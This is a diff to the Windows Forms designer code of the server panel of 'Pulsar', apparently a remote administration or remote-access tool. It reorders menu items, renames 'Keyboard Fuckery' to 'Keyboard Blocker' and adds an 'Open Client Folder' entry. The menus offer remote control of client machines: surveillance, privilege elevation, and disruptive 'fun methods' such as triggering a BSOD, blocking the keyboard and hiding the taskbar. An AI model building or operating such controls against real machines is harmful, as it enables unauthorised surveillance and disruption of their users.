@@ -105,12 +105,12 @@ namespace Pulsar.Server.Forms
             disableEnableKeyboardToolStripMenuItem = new ToolStripMenuItem();
             startToolStripMenuItem = new ToolStripMenuItem();
             stopToolStripMenuItem = new ToolStripMenuItem();
-            cDTrayToolStripMenuItem = new ToolStripMenuItem();
-            openToolStripMenuItem = new ToolStripMenuItem();
-            closeToolStripMenuItem = new ToolStripMenuItem();
             monitorsToolStripMenuItem = new ToolStripMenuItem();
             allOffToolStripMenuItem = new ToolStripMenuItem();
             allOnToolStripMenuItem = new ToolStripMenuItem();
+            cDTrayToolStripMenuItem = new ToolStripMenuItem();
+            openToolStripMenuItem = new ToolStripMenuItem();
+            closeToolStripMenuItem = new ToolStripMenuItem();
             connectionToolStripMenuItem = new ToolStripMenuItem();
             elevatedToolStripMenuItem = new ToolStripMenuItem();
             elevateClientPermissionsToolStripMenuItem = new ToolStripMenuItem();
@@ -128,6 +128,7 @@ namespace Pulsar.Server.Forms
             disconnectToolStripMenuItem = new ToolStripMenuItem();
             uninstallToolStripMenuItem = new ToolStripMenuItem();
             lineToolStripMenuItem = new ToolStripSeparator();
+            openClientFolderToolStripMenuItem = new ToolStripMenuItem();
             selectAllToolStripMenuItem = new ToolStripMenuItem();
             pluginManagerToolStripMenuItem = new ToolStripMenuItem();
             imgFlags = new ImageList(components);
@@ -276,9 +277,9 @@ namespace Pulsar.Server.Forms
             // 
             // contextMenuStrip
             // 
-            contextMenuStrip.Items.AddRange(new ToolStripItem[] { systemToolStripMenuItem, surveillanceToolStripMenuItem, userSupportToolStripMenuItem, quickCommandsToolStripMenuItem, funMethodsToolStripMenuItem, connectionToolStripMenuItem, lineToolStripMenuItem, selectAllToolStripMenuItem });
+            contextMenuStrip.Items.AddRange(new ToolStripItem[] { systemToolStripMenuItem, surveillanceToolStripMenuItem, userSupportToolStripMenuItem, quickCommandsToolStripMenuItem, funMethodsToolStripMenuItem, connectionToolStripMenuItem, lineToolStripMenuItem, openClientFolderToolStripMenuItem, selectAllToolStripMenuItem });
             contextMenuStrip.Name = "ctxtMenu";
-            contextMenuStrip.Size = new Size(180, 164);
+            contextMenuStrip.Size = new Size(180, 186);
             contextMenuStrip.Opening += contextMenuStrip_Opening;
             // 
             // systemToolStripMenuItem
@@ -609,7 +610,7 @@ namespace Pulsar.Server.Forms
             // 
             // funMethodsToolStripMenuItem
             // 
-            funMethodsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { bSODToolStripMenuItem, cWToolStripMenuItem, swapMouseButtonsToolStripMenuItem, hideTaskBarToolStripMenuItem, disableEnableKeyboardToolStripMenuItem, cDTrayToolStripMenuItem, monitorsToolStripMenuItem });
+            funMethodsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { bSODToolStripMenuItem, cWToolStripMenuItem, swapMouseButtonsToolStripMenuItem, hideTaskBarToolStripMenuItem, disableEnableKeyboardToolStripMenuItem, monitorsToolStripMenuItem, cDTrayToolStripMenuItem });
             funMethodsToolStripMenuItem.Image = Properties.Resources.emoticon_evilgrin;
             funMethodsToolStripMenuItem.Name = "funMethodsToolStripMenuItem";
             funMethodsToolStripMenuItem.Size = new Size(179, 22);
@@ -653,7 +654,7 @@ namespace Pulsar.Server.Forms
             disableEnableKeyboardToolStripMenuItem.Image = Properties.Resources.keyboardinput;
             disableEnableKeyboardToolStripMenuItem.Name = "disableEnableKeyboardToolStripMenuItem";
             disableEnableKeyboardToolStripMenuItem.Size = new Size(185, 22);
-            disableEnableKeyboardToolStripMenuItem.Text = "Keyboard Fuckery";
+            disableEnableKeyboardToolStripMenuItem.Text = "Keyboard Blocker";
             // 
             // startToolStripMenuItem
             // 
@@ -671,6 +672,30 @@ namespace Pulsar.Server.Forms
             stopToolStripMenuItem.Text = "Stop";
             stopToolStripMenuItem.Click += stopToolStripMenuItem_Click;
             // 
+            // monitorsToolStripMenuItem
+            // 
+            monitorsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { allOffToolStripMenuItem, allOnToolStripMenuItem });
+            monitorsToolStripMenuItem.Image = Properties.Resources.monitoricon;
+            monitorsToolStripMenuItem.Name = "monitorsToolStripMenuItem";
+            monitorsToolStripMenuItem.Size = new Size(185, 22);
+            monitorsToolStripMenuItem.Text = "Manage Monitors";
+            // 
+            // allOffToolStripMenuItem
+            // 
+            allOffToolStripMenuItem.Image = Properties.Resources.monitoron;
+            allOffToolStripMenuItem.Name = "allOffToolStripMenuItem";
+            allOffToolStripMenuItem.Size = new Size(108, 22);
+            allOffToolStripMenuItem.Text = "All On";
+            allOffToolStripMenuItem.Click += allOffToolStripMenuItem_Click;
+            // 
+            // allOnToolStripMenuItem
+            // 
+            allOnToolStripMenuItem.Image = Properties.Resources.monitoroff;
+            allOnToolStripMenuItem.Name = "allOnToolStripMenuItem";
+            allOnToolStripMenuItem.Size = new Size(108, 22);
+            allOnToolStripMenuItem.Text = "All Off";
+            allOnToolStripMenuItem.Click += allOnToolStripMenuItem_Click;
+            // 
             // cDTrayToolStripMenuItem
             // 
             cDTrayToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { openToolStripMenuItem, closeToolStripMenuItem });
@@ -683,7 +708,7 @@ namespace Pulsar.Server.Forms
             // 
             openToolStripMenuItem.Image = Properties.Resources.cdopen;
             openToolStripMenuItem.Name = "openToolStripMenuItem";
-            openToolStripMenuItem.Size = new Size(180, 22);
+            openToolStripMenuItem.Size = new Size(103, 22);
             openToolStripMenuItem.Text = "Open";
             openToolStripMenuItem.Click += openToolStripMenuItem_Click;
             // 
@@ -691,33 +716,9 @@ namespace Pulsar.Server.Forms
             // 
             closeToolStripMenuItem.Image = Properties.Resources.cdclose;
             closeToolStripMenuItem.Name = "closeToolStripMenuItem";
-            closeToolStripMenuItem.Size = new Size(180, 22);
+            closeToolStripMenuItem.Size = new Size(103, 22);
             closeToolStripMenuItem.Text = "Close";
             closeToolStripMenuItem.Click += closeToolStripMenuItem_Click_1;
-            // 
-            // monitorsToolStripMenuItem
-            // 
-            monitorsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { allOffToolStripMenuItem, allOnToolStripMenuItem });
-            monitorsToolStripMenuItem.Image = Properties.Resources.monitoricon;
-            monitorsToolStripMenuItem.Name = "monitorsToolStripMenuItem";
-            monitorsToolStripMenuItem.Size = new Size(185, 22);
-            monitorsToolStripMenuItem.Text = "Monitors";
-            // 
-            // allOffToolStripMenuItem
-            // 
-            allOffToolStripMenuItem.Image = Properties.Resources.monitoron;
-            allOffToolStripMenuItem.Name = "allOffToolStripMenuItem";
-            allOffToolStripMenuItem.Size = new Size(180, 22);
-            allOffToolStripMenuItem.Text = "All On";
-            allOffToolStripMenuItem.Click += allOffToolStripMenuItem_Click;
-            // 
-            // allOnToolStripMenuItem
-            // 
-            allOnToolStripMenuItem.Image = Properties.Resources.monitoroff;
-            allOnToolStripMenuItem.Name = "allOnToolStripMenuItem";
-            allOnToolStripMenuItem.Size = new Size(180, 22);
-            allOnToolStripMenuItem.Text = "All Off";
-            allOnToolStripMenuItem.Click += allOnToolStripMenuItem_Click;
             // 
             // connectionToolStripMenuItem
             // 
@@ -852,11 +853,20 @@ namespace Pulsar.Server.Forms
             lineToolStripMenuItem.Name = "lineToolStripMenuItem";
             lineToolStripMenuItem.Size = new Size(176, 6);
             // 
+            // openClientFolderToolStripMenuItem
+            // 
+            openClientFolderToolStripMenuItem.Image = Properties.Resources.lovefolder;
+            openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
+            openClientFolderToolStripMenuItem.Size = new Size(179, 22);
+            openClientFolderToolStripMenuItem.Text = "Open Client Folder";
+            openClientFolderToolStripMenuItem.Click += openClientFolderToolStripMenuItem_Click;
+            // 
             // selectAllToolStripMenuItem
             // 
+            selectAllToolStripMenuItem.Image = Properties.Resources.selectall;
             selectAllToolStripMenuItem.Name = "selectAllToolStripMenuItem";
             selectAllToolStripMenuItem.Size = new Size(179, 22);
-            selectAllToolStripMenuItem.Text = "Select All";
+            selectAllToolStripMenuItem.Text = "Select All Clients";
             selectAllToolStripMenuItem.Click += selectAllToolStripMenuItem_Click;
             // 
             // pluginManagerToolStripMenuItem
@@ -1620,10 +1630,10 @@ namespace Pulsar.Server.Forms
             // tabHeatMap
             // 
             tabHeatMap.Controls.Add(heatMapElementHost);
-            tabHeatMap.Location = new Point(4, 24);
+            tabHeatMap.Location = new Point(4, 22);
             tabHeatMap.Margin = new Padding(0);
             tabHeatMap.Name = "tabHeatMap";
-            tabHeatMap.Size = new Size(1136, 463);
+            tabHeatMap.Size = new Size(1136, 465);
             tabHeatMap.TabIndex = 2;
             tabHeatMap.Text = "Heat Map";
             tabHeatMap.UseVisualStyleBackColor = true;
@@ -1633,7 +1643,7 @@ namespace Pulsar.Server.Forms
             heatMapElementHost.Dock = DockStyle.Fill;
             heatMapElementHost.Location = new Point(0, 0);
             heatMapElementHost.Name = "heatMapElementHost";
-            heatMapElementHost.Size = new Size(1136, 463);
+            heatMapElementHost.Size = new Size(1136, 465);
             heatMapElementHost.TabIndex = 0;
             // 
             // tabPage2
@@ -2435,5 +2445,6 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem monitorsToolStripMenuItem;
         private ToolStripMenuItem allOffToolStripMenuItem;
         private ToolStripMenuItem allOnToolStripMenuItem;
+        private ToolStripMenuItem openClientFolderToolStripMenuItem;
     }
 }
